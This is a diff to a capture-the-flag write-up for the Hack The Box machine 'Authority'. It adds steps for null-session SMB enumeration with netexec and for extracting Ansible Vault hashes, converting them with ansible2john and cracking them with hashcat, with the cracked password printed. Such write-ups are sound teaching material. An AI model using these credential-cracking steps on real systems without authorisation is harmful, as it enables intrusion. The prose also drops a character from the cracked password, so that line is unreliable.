@@ -177,7 +177,7 @@ Results:
 SMB         10.129.229.56   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:None) (Null Auth:True)
 ```
 
-The scan returns the Netbios hostname (**`AUTHORITY`**), the domain name (**`authority.htb`**), Null authentication (**`true`**).
+The scan returns the Netbios hostname (**`AUTHORITY`**), the domain name (**`authority.htb`**), Null authentication (**`Null Auth:True`**).
 
 Further attempt to enumerate netexec: `netexec smb 10.129.229.56 -u '' -p '' --shares` and `netexec smb 10.129.229.56 --shares` return 
 
@@ -252,9 +252,34 @@ We can see the encryption type: `Ansible Value;1.1;AES 256`, going to hashcat we
 
 [How to crack Ansible passwords.](https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/)
 
-Trying to crack it with: `hashcat -m 16900 -a 0 hash.txt /usr/share/wordlist/rockyou.txt`
+we can use awk to grab the hashes by themselves: 
+`awk '/!vault \|/ { capture=1; next }
+     capture && /^[^ ]/ { capture=0 }
+     capture { print }'`
 
+Then can use sed to clean it up:
+`sed 's/^[[:space:]]*//' hash.txt > cleaned.txt`
 
+Now we have 3 hashes, move them into their own separate files:
+`ldap_vault`, `pwm_login_vault`, `pwm_password_vault`.
+
+Now with this we can use use ansible2john:
+`ansible2john ldap_vault pwm_password_vault pwm_login_vault >> vault_hashes`
+```
+ldap_vault:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635
+pwm_password_vault:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
+pwm_login_vault:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
+```
+
+Then we can use thes files to attempt to crack the vault passowrd.
+
+Trying to crack the vault password with: `hashcat -m 16900 -a 0 vault_hashes /usr/share/wordlist/rockyou.txt --user`
+```
+ldap_vault:$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635:!@#$%^&*
+pwm_password_vault:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#$%^&*
+pwm_login_vault:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8:!@#$%^&*
+```
+`!@#$%^&` is the Vault password. 
 
 
 
